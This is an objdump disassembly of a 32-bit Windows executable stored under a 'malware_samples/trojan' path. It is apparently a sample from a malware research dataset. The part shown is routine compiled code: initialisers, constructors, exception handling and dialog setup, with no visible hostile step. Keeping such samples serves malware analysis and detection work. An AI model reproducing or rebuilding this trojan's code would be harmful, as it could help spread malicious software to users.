
malware_samples/trojan/fa0928de71f544f854b43f4a888bf96621c3aae0577a9c1ef78ad70f0f61926d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	68 20 f0 43 00       	push   $0x43f020
  401005:	e8 f5 4d 00 00       	call   0x405dff
  40100a:	c3                   	ret
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	b9 98 10 44 00       	mov    $0x441098,%ecx
  401015:	e9 6a 5b 00 00       	jmp    0x406b84
  40101a:	cc                   	int3
  40101b:	cc                   	int3
  40101c:	cc                   	int3
  40101d:	cc                   	int3
  40101e:	cc                   	int3
  40101f:	cc                   	int3
  401020:	b9 30 10 44 00       	mov    $0x441030,%ecx
  401025:	e8 3e c3 00 00       	call   0x40d368
  40102a:	68 70 2b 43 00       	push   $0x432b70
  40102f:	e8 69 e0 01 00       	call   0x41f09d
  401034:	59                   	pop    %ecx
  401035:	c3                   	ret
  401036:	cc                   	int3
  401037:	cc                   	int3
  401038:	cc                   	int3
  401039:	cc                   	int3
  40103a:	cc                   	int3
  40103b:	cc                   	int3
  40103c:	cc                   	int3
  40103d:	cc                   	int3
  40103e:	cc                   	int3
  40103f:	cc                   	int3
  401040:	68 80 2b 43 00       	push   $0x432b80
  401045:	e8 53 e0 01 00       	call   0x41f09d
  40104a:	59                   	pop    %ecx
  40104b:	c3                   	ret
  40104c:	cc                   	int3
  40104d:	cc                   	int3
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	e8 ce f6 00 00       	call   0x410723
  401055:	a3 d8 81 44 00       	mov    %eax,0x4481d8
  40105a:	c3                   	ret
  40105b:	cc                   	int3
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	b9 e8 81 44 00       	mov    $0x4481e8,%ecx
  401065:	e9 53 0b 01 00       	jmp    0x411bbd
  40106a:	cc                   	int3
  40106b:	cc                   	int3
  40106c:	cc                   	int3
  40106d:	cc                   	int3
  40106e:	cc                   	int3
  40106f:	cc                   	int3
  401070:	b9 78 7a 45 00       	mov    $0x457a78,%ecx
  401075:	e8 56 e1 00 00       	call   0x40f1d0
  40107a:	68 90 2b 43 00       	push   $0x432b90
  40107f:	e8 19 e0 01 00       	call   0x41f09d
  401084:	59                   	pop    %ecx
  401085:	c3                   	ret
  401086:	cc                   	int3
  401087:	cc                   	int3
  401088:	cc                   	int3
  401089:	cc                   	int3
  40108a:	cc                   	int3
  40108b:	cc                   	int3
  40108c:	cc                   	int3
  40108d:	cc                   	int3
  40108e:	cc                   	int3
  40108f:	cc                   	int3
  401090:	b9 82 eb 45 00       	mov    $0x45eb82,%ecx
  401095:	e8 36 e1 00 00       	call   0x40f1d0
  40109a:	68 a0 2b 43 00       	push   $0x432ba0
  40109f:	e8 f9 df 01 00       	call   0x41f09d
  4010a4:	59                   	pop    %ecx
  4010a5:	c3                   	ret
  4010a6:	cc                   	int3
  4010a7:	cc                   	int3
  4010a8:	cc                   	int3
  4010a9:	cc                   	int3
  4010aa:	cc                   	int3
  4010ab:	cc                   	int3
  4010ac:	cc                   	int3
  4010ad:	cc                   	int3
  4010ae:	cc                   	int3
  4010af:	cc                   	int3
  4010b0:	b9 72 c4 44 00       	mov    $0x44c472,%ecx
  4010b5:	e8 16 e1 00 00       	call   0x40f1d0
  4010ba:	68 b0 2b 43 00       	push   $0x432bb0
  4010bf:	e8 d9 df 01 00       	call   0x41f09d
  4010c4:	59                   	pop    %ecx
  4010c5:	c3                   	ret
  4010c6:	cc                   	int3
  4010c7:	cc                   	int3
  4010c8:	cc                   	int3
  4010c9:	cc                   	int3
  4010ca:	cc                   	int3
  4010cb:	cc                   	int3
  4010cc:	cc                   	int3
  4010cd:	cc                   	int3
  4010ce:	cc                   	int3
  4010cf:	cc                   	int3
  4010d0:	b9 78 c5 44 00       	mov    $0x44c578,%ecx
  4010d5:	e8 e3 49 00 00       	call   0x405abd
  4010da:	68 c0 2b 43 00       	push   $0x432bc0
  4010df:	e8 b9 df 01 00       	call   0x41f09d
  4010e4:	59                   	pop    %ecx
  4010e5:	c3                   	ret
  4010e6:	cc                   	int3
  4010e7:	cc                   	int3
  4010e8:	cc                   	int3
  4010e9:	cc                   	int3
  4010ea:	cc                   	int3
  4010eb:	cc                   	int3
  4010ec:	cc                   	int3
  4010ed:	cc                   	int3
  4010ee:	cc                   	int3
  4010ef:	cc                   	int3
  4010f0:	68 d0 2b 43 00       	push   $0x432bd0
  4010f5:	e8 a3 df 01 00       	call   0x41f09d
  4010fa:	59                   	pop    %ecx
  4010fb:	c3                   	ret
  4010fc:	cc                   	int3
  4010fd:	cc                   	int3
  4010fe:	cc                   	int3
  4010ff:	cc                   	int3
  401100:	55                   	push   %ebp
  401101:	8b ec                	mov    %esp,%ebp
  401103:	81 ec 58 04 00 00    	sub    $0x458,%esp
  401109:	53                   	push   %ebx
  40110a:	56                   	push   %esi
  40110b:	57                   	push   %edi
  40110c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40110f:	8d b5 a8 fb ff ff    	lea    -0x458(%ebp),%esi
  401115:	bb 00 02 00 00       	mov    $0x200,%ebx
  40111a:	85 ff                	test   %edi,%edi
  40111c:	74 41                	je     0x40115f
  40111e:	53                   	push   %ebx
  40111f:	57                   	push   %edi
  401120:	8b c6                	mov    %esi,%eax
  401122:	50                   	push   %eax
  401123:	e8 da f4 00 00       	call   0x410602
  401128:	8b c6                	mov    %esi,%eax
  40112a:	50                   	push   %eax
  40112b:	e8 e3 2c 02 00       	call   0x423e13
  401130:	59                   	pop    %ecx
  401131:	8d b5 aa fb ff ff    	lea    -0x456(%ebp),%esi
  401137:	8d 34 46             	lea    (%esi,%eax,2),%esi
  40113a:	8d 85 a8 fb ff ff    	lea    -0x458(%ebp),%eax
  401140:	8b ce                	mov    %esi,%ecx
  401142:	2b c8                	sub    %eax,%ecx
  401144:	8b c3                	mov    %ebx,%eax
  401146:	d1 f9                	sar    $1,%ecx
  401148:	2b c1                	sub    %ecx,%eax
  40114a:	50                   	push   %eax
  40114b:	57                   	push   %edi
  40114c:	56                   	push   %esi
  40114d:	e8 b0 f4 00 00       	call   0x410602
  401152:	56                   	push   %esi
  401153:	e8 bb 2c 02 00       	call   0x423e13
  401158:	59                   	pop    %ecx
  401159:	8d 34 46             	lea    (%esi,%eax,2),%esi
  40115c:	83 c6 02             	add    $0x2,%esi
  40115f:	8d 85 a8 fb ff ff    	lea    -0x458(%ebp),%eax
  401165:	8b ce                	mov    %esi,%ecx
  401167:	2b c8                	sub    %eax,%ecx
  401169:	8b c3                	mov    %ebx,%eax
  40116b:	d1 f9                	sar    $1,%ecx
  40116d:	2b c1                	sub    %ecx,%eax
  40116f:	50                   	push   %eax
  401170:	68 a3 00 00 00       	push   $0xa3
  401175:	e8 9d d4 00 00       	call   0x40e617
  40117a:	50                   	push   %eax
  40117b:	56                   	push   %esi
  40117c:	e8 81 f4 00 00       	call   0x410602
  401181:	56                   	push   %esi
  401182:	e8 8c 2c 02 00       	call   0x423e13
  401187:	59                   	pop    %ecx
  401188:	8d 8d a8 fb ff ff    	lea    -0x458(%ebp),%ecx
  40118e:	8d 34 46             	lea    (%esi,%eax,2),%esi
  401191:	83 c6 02             	add    $0x2,%esi
  401194:	8b c6                	mov    %esi,%eax
  401196:	2b c1                	sub    %ecx,%eax
  401198:	d1 f8                	sar    $1,%eax
  40119a:	2b d8                	sub    %eax,%ebx
  40119c:	53                   	push   %ebx
  40119d:	68 f0 35 43 00       	push   $0x4335f0
  4011a2:	56                   	push   %esi
  4011a3:	e8 5a f4 00 00       	call   0x410602
  4011a8:	56                   	push   %esi
  4011a9:	e8 65 2c 02 00       	call   0x423e13
  4011ae:	33 c9                	xor    %ecx,%ecx
  4011b0:	6a 58                	push   $0x58
  4011b2:	66 89 4c 46 02       	mov    %cx,0x2(%esi,%eax,2)
  4011b7:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4011ba:	5e                   	pop    %esi
  4011bb:	56                   	push   %esi
  4011bc:	51                   	push   %ecx
  4011bd:	50                   	push   %eax
  4011be:	e8 2d ee 01 00       	call   0x41fff0
  4011c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4011c6:	83 c4 10             	add    $0x10,%esp
  4011c9:	8a 5d 18             	mov    0x18(%ebp),%bl
  4011cc:	8b 7d 10             	mov    0x10(%ebp),%edi
  4011cf:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4011d2:	a1 28 10 44 00       	mov    0x441028,%eax
  4011d7:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4011da:	8d 85 a8 fb ff ff    	lea    -0x458(%ebp),%eax
  4011e0:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4011e3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4011e6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4011e9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4011ec:	89 75 a8             	mov    %esi,-0x58(%ebp)
  4011ef:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4011f2:	c7 45 c8 00 08 00 00 	movl   $0x800,-0x38(%ebp)
  4011f9:	c7 45 dc 0c 08 01 00 	movl   $0x1080c,-0x24(%ebp)
  401200:	50                   	push   %eax
  401201:	84 db                	test   %bl,%bl
  401203:	74 08                	je     0x40120d
  401205:	ff 15 3c 30 46 00    	call   *0x46303c
  40120b:	eb 06                	jmp    0x401213
  40120d:	ff 15 44 30 46 00    	call   *0x463044
  401213:	8b f0                	mov    %eax,%esi
  401215:	85 f6                	test   %esi,%esi
  401217:	75 2c                	jne    0x401245
  401219:	ff 15 40 30 46 00    	call   *0x463040
  40121f:	3d 02 30 00 00       	cmp    $0x3002,%eax
  401224:	75 1d                	jne    0x401243
  401226:	33 c0                	xor    %eax,%eax
  401228:	66 89 07             	mov    %ax,(%edi)
  40122b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40122e:	50                   	push   %eax
  40122f:	84 db                	test   %bl,%bl
  401231:	74 08                	je     0x40123b
  401233:	ff 15 3c 30 46 00    	call   *0x46303c
  401239:	eb 06                	jmp    0x401241
  40123b:	ff 15 44 30 46 00    	call   *0x463044
  401241:	8b f0                	mov    %eax,%esi
  401243:	85 f6                	test   %esi,%esi
  401245:	5f                   	pop    %edi
  401246:	5e                   	pop    %esi
  401247:	0f 95 c0             	setne  %al
  40124a:	5b                   	pop    %ebx
  40124b:	c9                   	leave
  40124c:	c2 14 00             	ret    $0x14
  40124f:	55                   	push   %ebp
  401250:	8b ec                	mov    %esp,%ebp
  401252:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  401258:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40125b:	56                   	push   %esi
  40125c:	50                   	push   %eax
  40125d:	ff 15 90 30 46 00    	call   *0x463090
  401263:	85 c0                	test   %eax,%eax
  401265:	75 60                	jne    0x4012c7
  401267:	8b 45 08             	mov    0x8(%ebp),%eax
  40126a:	33 c9                	xor    %ecx,%ecx
  40126c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40126f:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  401275:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401278:	8b 45 0c             	mov    0xc(%ebp),%eax
  40127b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40127e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401281:	50                   	push   %eax
  401282:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401285:	c7 45 ec 41 00 00 00 	movl   $0x41,-0x14(%ebp)
  40128c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40128f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401292:	ff 15 80 30 46 00    	call   *0x463080
  401298:	8b f0                	mov    %eax,%esi
  40129a:	85 f6                	test   %esi,%esi
  40129c:	74 29                	je     0x4012c7
  40129e:	53                   	push   %ebx
  40129f:	ff 75 10             	push   0x10(%ebp)
  4012a2:	56                   	push   %esi
  4012a3:	ff 15 84 30 46 00    	call   *0x463084
  4012a9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4012ac:	85 c0                	test   %eax,%eax
  4012ae:	56                   	push   %esi
  4012af:	51                   	push   %ecx
  4012b0:	0f 95 c3             	setne  %bl
  4012b3:	8b 11                	mov    (%ecx),%edx
  4012b5:	8b 72 14             	mov    0x14(%edx),%esi
  4012b8:	8b ce                	mov    %esi,%ecx
  4012ba:	ff 15 78 32 43 00    	call   *0x433278
  4012c0:	ff d6                	call   *%esi
  4012c2:	8a c3                	mov    %bl,%al
  4012c4:	5b                   	pop    %ebx
  4012c5:	eb 02                	jmp    0x4012c9
  4012c7:	32 c0                	xor    %al,%al
  4012c9:	5e                   	pop    %esi
  4012ca:	c9                   	leave
  4012cb:	c2 10 00             	ret    $0x10
  4012ce:	cc                   	int3
  4012cf:	cc                   	int3
  4012d0:	c2 00 00             	ret    $0x0
  4012d3:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  4012d8:	50                   	push   %eax
  4012d9:	ff 74 24 0c          	push   0xc(%esp)
  4012dd:	ff 74 24 0c          	push   0xc(%esp)
  4012e1:	ff 15 60 31 46 00    	call   *0x463160
  4012e7:	50                   	push   %eax
  4012e8:	ff 15 5c 31 46 00    	call   *0x46315c
  4012ee:	c2 0c 00             	ret    $0xc
  4012f1:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  4012f6:	f7 d8                	neg    %eax
  4012f8:	1b c0                	sbb    %eax,%eax
  4012fa:	83 e0 09             	and    $0x9,%eax
  4012fd:	50                   	push   %eax
  4012fe:	ff 74 24 0c          	push   0xc(%esp)
  401302:	ff 74 24 0c          	push   0xc(%esp)
  401306:	ff 15 60 31 46 00    	call   *0x463160
  40130c:	50                   	push   %eax
  40130d:	ff 15 6c 31 46 00    	call   *0x46316c
  401313:	c2 0c 00             	ret    $0xc
  401316:	55                   	push   %ebp
  401317:	8b ec                	mov    %esp,%ebp
  401319:	83 7d 0c 30          	cmpl   $0x30,0xc(%ebp)
  40131d:	74 59                	je     0x401378
  40131f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  401326:	75 5d                	jne    0x401385
  401328:	8a 45 20             	mov    0x20(%ebp),%al
  40132b:	b9 30 10 44 00       	mov    $0x441030,%ecx
  401330:	24 01                	and    $0x1,%al
  401332:	0f b6 c0             	movzbl %al,%eax
  401335:	50                   	push   %eax
  401336:	ff 75 18             	push   0x18(%ebp)
  401339:	ff 75 08             	push   0x8(%ebp)
  40133c:	e8 a7 cf 00 00       	call   0x40e2e8
  401341:	f6 45 20 01          	testb  $0x1,0x20(%ebp)
  401345:	74 3e                	je     0x401385
  401347:	ff 75 08             	push   0x8(%ebp)
  40134a:	ff 15 54 31 46 00    	call   *0x463154
  401350:	85 c0                	test   %eax,%eax
  401352:	74 31                	je     0x401385
  401354:	68 21 30 00 00       	push   $0x3021
  401359:	50                   	push   %eax
  40135a:	ff 15 60 31 46 00    	call   *0x463160
  401360:	85 c0                	test   %eax,%eax
  401362:	74 21                	je     0x401385
  401364:	f6 45 20 08          	testb  $0x8,0x20(%ebp)
  401368:	74 1b                	je     0x401385
  40136a:	68 f4 35 43 00       	push   $0x4335f4
  40136f:	50                   	push   %eax
  401370:	ff 15 58 31 46 00    	call   *0x463158
  401376:	eb 0d                	jmp    0x401385
  401378:	ff 75 08             	push   0x8(%ebp)
  40137b:	b9 30 10 44 00       	mov    $0x441030,%ecx
  401380:	e8 3c cf 00 00       	call   0x40e2c1
  401385:	32 c0                	xor    %al,%al
  401387:	5d                   	pop    %ebp
  401388:	c2 1c 00             	ret    $0x1c
  40138b:	55                   	push   %ebp
  40138c:	8b ec                	mov    %esp,%ebp
  40138e:	83 ec 4c             	sub    $0x4c,%esp
  401391:	ff 75 08             	push   0x8(%ebp)
  401394:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  401397:	e8 2a 02 00 00       	call   0x4015c6
  40139c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40139f:	83 f9 08             	cmp    $0x8,%ecx
  4013a2:	73 0a                	jae    0x4013ae
  4013a4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4013a7:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  4013ab:	ff 45 f4             	incl   -0xc(%ebp)
  4013ae:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4013b1:	e8 48 02 01 00       	call   0x4115fe
  4013b6:	c9                   	leave
  4013b7:	c2 08 00             	ret    $0x8
  4013ba:	56                   	push   %esi
  4013bb:	ff 74 24 08          	push   0x8(%esp)
  4013bf:	8b f1                	mov    %ecx,%esi
  4013c1:	33 c0                	xor    %eax,%eax
  4013c3:	89 06                	mov    %eax,(%esi)
  4013c5:	89 46 04             	mov    %eax,0x4(%esi)
  4013c8:	89 46 08             	mov    %eax,0x8(%esi)
  4013cb:	89 46 0c             	mov    %eax,0xc(%esi)
  4013ce:	88 46 10             	mov    %al,0x10(%esi)
  4013d1:	e8 5c 03 00 00       	call   0x401732
  4013d6:	8b c6                	mov    %esi,%eax
  4013d8:	5e                   	pop    %esi
  4013d9:	c2 04 00             	ret    $0x4
  4013dc:	b8 35 26 43 00       	mov    $0x432635,%eax
  4013e1:	e8 92 d7 01 00       	call   0x41eb78
  4013e6:	51                   	push   %ecx
  4013e7:	51                   	push   %ecx
  4013e8:	53                   	push   %ebx
  4013e9:	56                   	push   %esi
  4013ea:	8b f1                	mov    %ecx,%esi
  4013ec:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4013ef:	e8 62 81 00 00       	call   0x409556
  4013f4:	33 db                	xor    %ebx,%ebx
  4013f6:	c7 06 f8 35 43 00    	movl   $0x4335f8,(%esi)
  4013fc:	8d 8e 38 10 00 00    	lea    0x1038(%esi),%ecx
  401402:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401405:	e8 2d 4a 00 00       	call   0x405e37
  40140a:	8d 8e f8 20 00 00    	lea    0x20f8(%esi),%ecx
  401410:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401414:	e8 27 ba 00 00       	call   0x40ce40
  401419:	8d 8e 98 22 00 00    	lea    0x2298(%esi),%ecx
  40141f:	89 9e e8 21 00 00    	mov    %ebx,0x21e8(%esi)
  401425:	89 9e ec 21 00 00    	mov    %ebx,0x21ec(%esi)
  40142b:	e8 4a 01 00 00       	call   0x40157a
  401430:	8d 8e e8 45 00 00    	lea    0x45e8(%esi),%ecx
  401436:	e8 3f 01 00 00       	call   0x40157a
  40143b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40143e:	85 c9                	test   %ecx,%ecx
  401440:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  401444:	0f 94 c0             	sete   %al
  401447:	89 9e d4 21 00 00    	mov    %ebx,0x21d4(%esi)
  40144d:	88 86 d0 21 00 00    	mov    %al,0x21d0(%esi)
  401453:	85 c9                	test   %ecx,%ecx
  401455:	75 23                	jne    0x40147a
  401457:	68 f0 92 00 00       	push   $0x92f0
  40145c:	e8 d7 d6 01 00       	call   0x41eb38
  401461:	59                   	pop    %ecx
  401462:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401465:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  401469:	85 c0                	test   %eax,%eax
  40146b:	74 09                	je     0x401476
  40146d:	8b c8                	mov    %eax,%ecx
  40146f:	e8 91 a0 00 00       	call   0x40b505
  401474:	eb 06                	jmp    0x40147c
  401476:	8b c3                	mov    %ebx,%eax
  401478:	eb 02                	jmp    0x40147c
  40147a:	8b c1                	mov    %ecx,%eax
  40147c:	89 86 d4 21 00 00    	mov    %eax,0x21d4(%esi)
  401482:	8a 80 a1 71 00 00    	mov    0x71a1(%eax),%al
  401488:	83 8e d8 21 00 00 ff 	orl    $0xffffffff,0x21d8(%esi)
  40148f:	83 8e dc 21 00 00 ff 	orl    $0xffffffff,0x21dc(%esi)
  401496:	83 8e e0 21 00 00 ff 	orl    $0xffffffff,0x21e0(%esi)
  40149d:	6a 40                	push   $0x40
  40149f:	88 46 30             	mov    %al,0x30(%esi)
  4014a2:	8d 86 20 22 00 00    	lea    0x2220(%esi),%eax
  4014a8:	53                   	push   %ebx
  4014a9:	50                   	push   %eax
  4014aa:	c7 86 c8 6c 00 00 02 	movl   $0x2,0x6cc8(%esi)
  4014b1:	00 00 00 
  4014b4:	89 9e cc 6c 00 00    	mov    %ebx,0x6ccc(%esi)
  4014ba:	89 9e d0 6c 00 00    	mov    %ebx,0x6cd0(%esi)
  4014c0:	89 9e d8 6c 00 00    	mov    %ebx,0x6cd8(%esi)
  4014c6:	89 9e e8 21 00 00    	mov    %ebx,0x21e8(%esi)
  4014cc:	89 9e ec 21 00 00    	mov    %ebx,0x21ec(%esi)
  4014d2:	88 9e d4 6c 00 00    	mov    %bl,0x6cd4(%esi)
  4014d8:	66 89 9e dc 6c 00 00 	mov    %bx,0x6cdc(%esi)
  4014df:	89 9e f0 21 00 00    	mov    %ebx,0x21f0(%esi)
  4014e5:	89 9e b8 6c 00 00    	mov    %ebx,0x6cb8(%esi)
  4014eb:	89 9e bc 6c 00 00    	mov    %ebx,0x6cbc(%esi)
  4014f1:	89 9e c0 6c 00 00    	mov    %ebx,0x6cc0(%esi)
  4014f7:	89 9e c4 6c 00 00    	mov    %ebx,0x6cc4(%esi)
  4014fd:	e8 ee ea 01 00       	call   0x41fff0
  401502:	6a 34                	push   $0x34
  401504:	8d 86 60 22 00 00    	lea    0x2260(%esi),%eax
  40150a:	53                   	push   %ebx
  40150b:	50                   	push   %eax
  40150c:	e8 df ea 01 00       	call   0x41fff0
  401511:	6a 20                	push   $0x20
  401513:	8d 86 a8 45 00 00    	lea    0x45a8(%esi),%eax
  401519:	53                   	push   %ebx
  40151a:	50                   	push   %eax
  40151b:	e8 d0 ea 01 00       	call   0x41fff0
  401520:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401523:	83 c4 24             	add    $0x24,%esp
  401526:	89 9e f0 6c 00 00    	mov    %ebx,0x6cf0(%esi)
  40152c:	33 c0                	xor    %eax,%eax
  40152e:	89 9e f8 6c 00 00    	mov    %ebx,0x6cf8(%esi)
  401534:	89 9e fc 6c 00 00    	mov    %ebx,0x6cfc(%esi)
  40153a:	89 9e 00 6d 00 00    	mov    %ebx,0x6d00(%esi)
  401540:	89 9e 04 6d 00 00    	mov    %ebx,0x6d04(%esi)
  401546:	89 9e 08 6d 00 00    	mov    %ebx,0x6d08(%esi)
  40154c:	89 9e 0c 6d 00 00    	mov    %ebx,0x6d0c(%esi)
  401552:	66 89 86 12 6d 00 00 	mov    %ax,0x6d12(%esi)
  401559:	8b c6                	mov    %esi,%eax
  40155b:	88 9e ee 6c 00 00    	mov    %bl,0x6cee(%esi)
  401561:	88 9e 10 6d 00 00    	mov    %bl,0x6d10(%esi)
  401567:	88 9e f8 21 00 00    	mov    %bl,0x21f8(%esi)
  40156d:	5e                   	pop    %esi
  40156e:	5b                   	pop    %ebx
  40156f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401576:	c9                   	leave
  401577:	c2 04 00             	ret    $0x4
  40157a:	51                   	push   %ecx
  40157b:	33 c0                	xor    %eax,%eax
  40157d:	89 0c 24             	mov    %ecx,(%esp)
  401580:	89 81 28 10 00 00    	mov    %eax,0x1028(%ecx)
  401586:	89 81 2c 10 00 00    	mov    %eax,0x102c(%ecx)
  40158c:	89 81 30 10 00 00    	mov    %eax,0x1030(%ecx)
  401592:	89 81 34 10 00 00    	mov    %eax,0x1034(%ecx)
  401598:	88 81 38 10 00 00    	mov    %al,0x1038(%ecx)
  40159e:	89 81 40 10 00 00    	mov    %eax,0x1040(%ecx)
  4015a4:	89 81 44 10 00 00    	mov    %eax,0x1044(%ecx)
  4015aa:	89 81 48 10 00 00    	mov    %eax,0x1048(%ecx)
  4015b0:	89 81 4c 10 00 00    	mov    %eax,0x104c(%ecx)
  4015b6:	89 81 50 10 00 00    	mov    %eax,0x1050(%ecx)
  4015bc:	89 81 54 10 00 00    	mov    %eax,0x1054(%ecx)
  4015c2:	8b c1                	mov    %ecx,%eax
  4015c4:	59                   	pop    %ecx
  4015c5:	c3                   	ret
  4015c6:	56                   	push   %esi
  4015c7:	57                   	push   %edi
  4015c8:	8b f1                	mov    %ecx,%esi
  4015ca:	b8 f4 35 43 00       	mov    $0x4335f4,%eax
  4015cf:	6a 08                	push   $0x8
  4015d1:	59                   	pop    %ecx
  4015d2:	8b fe                	mov    %esi,%edi
  4015d4:	f3 ab                	rep stos %eax,%es:(%edi)
  4015d6:	6a 20                	push   $0x20
  4015d8:	33 ff                	xor    %edi,%edi
  4015da:	8d 46 20             	lea    0x20(%esi),%eax
  4015dd:	57                   	push   %edi
  4015de:	50                   	push   %eax
  4015df:	e8 0c ea 01 00       	call   0x41fff0
  4015e4:	8b 44 24 18          	mov    0x18(%esp),%eax
  4015e8:	83 c4 0c             	add    $0xc,%esp
  4015eb:	89 7e 40             	mov    %edi,0x40(%esi)
  4015ee:	89 7e 44             	mov    %edi,0x44(%esi)
  4015f1:	89 46 48             	mov    %eax,0x48(%esi)
  4015f4:	8b c6                	mov    %esi,%eax
  4015f6:	5f                   	pop    %edi
  4015f7:	5e                   	pop    %esi
  4015f8:	c2 04 00             	ret    $0x4
  4015fb:	55                   	push   %ebp
  4015fc:	8b ec                	mov    %esp,%ebp
  4015fe:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401604:	6a ff                	push   $0xffffffff
  401606:	68 41 26 43 00       	push   $0x432641
  40160b:	50                   	push   %eax
  40160c:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401613:	56                   	push   %esi
  401614:	8b f1                	mov    %ecx,%esi
  401616:	83 3e 00             	cmpl   $0x0,(%esi)
  401619:	74 18                	je     0x401633
  40161b:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  40161f:	74 0a                	je     0x40162b
  401621:	ff 76 08             	push   0x8(%esi)
  401624:	ff 36                	push   (%esi)
  401626:	e8 1a de 00 00       	call   0x40f445
  40162b:	ff 36                	push   (%esi)
  40162d:	e8 fc 27 02 00       	call   0x423e2e
  401632:	59                   	pop    %ecx
  401633:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401636:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40163d:	5e                   	pop    %esi
  40163e:	c9                   	leave
  40163f:	c3                   	ret
  401640:	cc                   	int3
  401641:	cc                   	int3
  401642:	cc                   	int3
  401643:	cc                   	int3
  401644:	cc                   	int3
  401645:	55                   	push   %ebp
  401646:	8b ec                	mov    %esp,%ebp
  401648:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40164e:	6a ff                	push   $0xffffffff
  401650:	68 41 26 43 00       	push   $0x432641
  401655:	50                   	push   %eax
  401656:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40165d:	56                   	push   %esi
  40165e:	8b f1                	mov    %ecx,%esi
  401660:	83 3e 00             	cmpl   $0x0,(%esi)
  401663:	74 1b                	je     0x401680
  401665:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  401669:	74 0d                	je     0x401678
  40166b:	8b 46 08             	mov    0x8(%esi),%eax
  40166e:	03 c0                	add    %eax,%eax
  401670:	50                   	push   %eax
  401671:	ff 36                	push   (%esi)
  401673:	e8 cd dd 00 00       	call   0x40f445
  401678:	ff 36                	push   (%esi)
  40167a:	e8 af 27 02 00       	call   0x423e2e
  40167f:	59                   	pop    %ecx
  401680:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401683:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40168a:	5e                   	pop    %esi
  40168b:	c9                   	leave
  40168c:	c3                   	ret
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	cc                   	int3
  401691:	cc                   	int3
  401692:	56                   	push   %esi
  401693:	8b f1                	mov    %ecx,%esi
  401695:	80 be d0 21 00 00 00 	cmpb   $0x0,0x21d0(%esi)
  40169c:	c7 06 f8 35 43 00    	movl   $0x4335f8,(%esi)
  4016a2:	74 20                	je     0x4016c4
  4016a4:	57                   	push   %edi
  4016a5:	8b be d4 21 00 00    	mov    0x21d4(%esi),%edi
  4016ab:	85 ff                	test   %edi,%edi
  4016ad:	74 14                	je     0x4016c3
  4016af:	8b cf                	mov    %edi,%ecx
  4016b1:	e8 3e 9f 00 00       	call   0x40b5f4
  4016b6:	68 f0 92 00 00       	push   $0x92f0
  4016bb:	57                   	push   %edi
  4016bc:	e8 a7 d4 01 00       	call   0x41eb68
  4016c1:	59                   	pop    %ecx
  4016c2:	59                   	pop    %ecx
  4016c3:	5f                   	pop    %edi
  4016c4:	8d 8e 10 56 00 00    	lea    0x5610(%esi),%ecx
  4016ca:	e8 2c ff ff ff       	call   0x4015fb
  4016cf:	8d 8e c0 32 00 00    	lea    0x32c0(%esi),%ecx
  4016d5:	e8 21 ff ff ff       	call   0x4015fb
  4016da:	8d 8e f8 20 00 00    	lea    0x20f8(%esi),%ecx
  4016e0:	e8 fc b7 00 00       	call   0x40cee1
  4016e5:	8d 8e 38 10 00 00    	lea    0x1038(%esi),%ecx
  4016eb:	e8 12 48 00 00       	call   0x405f02
  4016f0:	8b ce                	mov    %esi,%ecx
  4016f2:	5e                   	pop    %esi
  4016f3:	e9 a2 7e 00 00       	jmp    0x40959a
  4016f8:	81 c1 28 10 00 00    	add    $0x1028,%ecx
  4016fe:	e9 f8 fe ff ff       	jmp    0x4015fb
  401703:	cc                   	int3
  401704:	cc                   	int3
  401705:	cc                   	int3
